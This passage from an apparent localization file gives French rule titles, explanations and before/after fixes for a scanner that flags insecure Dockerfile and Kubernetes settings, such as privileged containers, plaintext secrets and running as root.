      'Une instruction FROM utilise explicitement le tag ":latest" au lieu d\'une version précise. "latest" change avec le temps : le même build, refait à un autre moment, peut obtenir une version différente de l\'image de base — un build non reproductible, et une mise à jour non désirée peut arriver sans que personne ait décidé qu\'elle devait avoir lieu.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Le Dockerfile télécharge un fichier distant avec ADD au lieu de COPY",
    description:
      "Une instruction ADD avec une URL http/https télécharge un fichier depuis internet pendant le build, sans aucune vérification d'intégrité et avec un contenu invisible dans le dépôt. Si cette URL est un jour compromise, le build récupère un contenu arbitraire sans que personne ne le remarque en lisant simplement le Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash attendu>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Un conteneur du manifeste Kubernetes s'exécute en mode privilégié",
    description:
      '"privileged: true" dans le securityContext d\'un conteneur désactive presque toute l\'isolation habituelle entre le conteneur et l\'hôte : le conteneur peut accéder aux périphériques de l\'hôte, modifier sa configuration réseau, et dans de nombreux cas obtenir de fait un accès root à la machine qui l\'exécute. Presque jamais nécessaire pour une application normale.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # seulement les capabilities réellement nécessaires`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Un secret est écrit en clair dans une variable d'environnement d'un manifeste Kubernetes",
    description:
      'Une variable d\'environnement avec un nom du type password/secret/token/key a une valeur littérale ("value:") au lieu d\'être lue depuis un Secret ("valueFrom.secretKeyRef"). Le manifeste lui-même — souvent committé dans un dépôt — contient donc le secret en clair, visible même par quelqu\'un qui ne peut que lire la configuration, sans nécessairement exécuter des commandes dans le cluster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Un conteneur du manifeste Kubernetes est configuré pour s'exécuter en tant que root",
    description:
      '"runAsUser: 0" ou "runAsNonRoot: false" dans le securityContext forcent explicitement le conteneur à s\'exécuter en tant que root. Si un attaquant parvient à exécuter du code dans le conteneur (ex. en exploitant une bibliothèque vulnérable), être root dans le conteneur facilite une évasion vers l\'hôte — ou un impact plus large.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Un conteneur du manifeste Kubernetes peut obtenir plus de privilèges qu'il n'en avait au démarrage",
    description:
      '"allowPrivilegeEscalation: true" dans le securityContext permet à un processus dans le conteneur d\'obtenir plus de privilèges que le processus qui l\'a démarré (ex. via un binaire setuid). Combiné à une vulnérabilité dans l\'application, c\'est un pas de plus vers l\'exécution de code avec plus de privilèges que prévu.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Un pod du manifeste Kubernetes partage le réseau, les processus ou la mémoire partagée de l'hôte",
    description:
      '"hostNetwork", "hostPID" ou "hostIPC" réglés sur true sortent le pod de son isolation normale : hostNetwork expose le pod sur le réseau de l\'hôte (contournant les network policies du cluster), hostPID lui donne une visibilité sur tous les processus de la machine hôte, hostIPC lui donne accès à la mémoire partagée de l\'hôte. Presque jamais nécessaire pour une application normale — généralement réservé aux outils système/monitoring de bas niveau.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Le manifeste Kubernetes n'impose pas explicitement l'exécution avec un utilisateur non-root",
    description:
      'Aucun "runAsNonRoot" nulle part dans le manifeste (ni au niveau du pod ni du conteneur) : sans le définir, un conteneur s\'exécute avec l\'utilisateur défini par son image — souvent root par défaut, si l\'image elle-même n\'a pas changé cela. Le définir explicitement à true empêche le pod de démarrer si l\'image essaie encore de s\'exécuter en tant que root, au lieu de le découvrir seulement après un incident.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dépendance vulnérable :"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Aucune version corrigée connue pour le moment — envisagez un package alternatif ou suivez les mises à jour du projet."
      ),
    },
  }),
},
};
